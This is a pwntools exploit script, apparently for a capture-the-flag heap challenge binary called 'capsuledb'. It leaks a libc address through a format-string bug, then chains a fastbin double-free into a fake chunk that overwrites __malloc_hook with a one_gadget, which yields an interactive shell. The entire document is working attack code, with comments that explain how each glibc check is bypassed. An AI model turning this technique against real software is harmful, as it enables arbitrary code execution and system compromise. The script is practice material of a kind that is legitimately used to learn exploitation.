from pwn import *

elf = context.binary = ELF("./capsuledb-1_2", checksec=False)

proc = process()
#proc = remote("127.0.0.1",6666)


#gdb.attach(proc,"""continue
#""")
indexcount = 0
def malloc(size,data):
    #sleep(0.1)
    #proc.recvuntil(b"> ")
    proc.sendline(b"1")
    sleep(0.1)
    #proc.recvuntil(b"]: ")
    proc.sendline(b"2")
    sleep(0.1)
    #proc.recvuntil(b"Size: ")
    proc.sendline(f"{size}".encode())
    sleep(0.1)
    #proc.recvuntil(b"Data:")
    proc.sendline(data)
    sleep(0.1)
    #proc.recvlines(10)
    global indexcount
    indexcount = indexcount+1
    return indexcount-1

def free(index):
    #proc.recvuntil(b"> ")
    sleep(0.1)
    proc.sendline(b"3")
    sleep(0.1)
    #proc.recvuntil(b"Index?: ")
    proc.sendline(f"{index}".encode())
    sleep(0.1)

def edit(index,data):
    #proc.recvuntil(b"> ")
    sleep(0.1)
    proc.sendline(b"2")
    #proc.recvuntil(b"Index: ")
    sleep(0.1)
    proc.sendline(f"{index}".encode())
    #proc.recvuntil(b"]: ")
    sleep(0.1)
    proc.sendline(b"2")
    #proc.recvuntil(b"Data:")
    sleep(0.1)
    proc.sendline(data)
    sleep(0.1)
    #proc.recvlines(2)


def view_data(index):
    sleep(0.1)
    proc.sendline(b"4")
    sleep(0.1)
    proc.sendline(f"{index}".encode())
    sleep(0.1)
    proc.sendline(b"2")
    proc.recvuntil(b" *********")
    proc.recvline()
    data=proc.recvline().strip(b"\n")
    return data

def double_free():
    libc = context.binary = ELF("./libc.so.6", checksec=False)
    leak_chunk=malloc(0x68,b"%3$p") # Libc address Leak using format string bug
    libc_leak = view_data(leak_chunk)

    libc_base = int(libc_leak,16) - 0xf73c0 # Libc base address derived from Libc Leak
    libc.address = libc_base

    print(hex(libc.address))

    one_gadget = libc_base + 0xf1247 # One_Gadget from libc

    chunk1=malloc(0x68,b"A") # Create Chunk1
    #sleep(0.1)
    chunk2=malloc(0x68,b"B") # Create Chunk2

    #Double-Free
    free(chunk1) # Free Chunk1
    free(chunk2) # Free Chunk2
    free(chunk1) # Then Free Chunk1 again to avoid Fasttop double-free check

    fake_fast = libc.sym.__malloc_hook - 35 # fake fast chunk to bypass fastbin size check. pwndbg> find_fake_fast &__malloc_hook
    chunk3=malloc(0x68,p64(fake_fast)) # use chunk1, write fake_fast chunk address to gain arbitrary write



    chunk4 = malloc(0x68,b"C") # use chunk 2, Unfree Chunk2

    chunk5 = malloc(0x68,p64(fake_fast)) # use chunk1 again

    chunk6 = malloc(0x68,b"B"*19+p64(one_gadget)) # use fake_fast chunk to overwrite malloc_hook to our one_gadget
    # malloc writes data or considers chunk's userdata 16-bytes forward of the pointer that's stored in Fastbin. Chunk addr in Fastbin+16 = writable area


    malloc(20,b"id") # malloc() -> one_gadget()

double_free()




sleep(0.1)
proc.recvuntil(b"7/16")
proc.interactive()
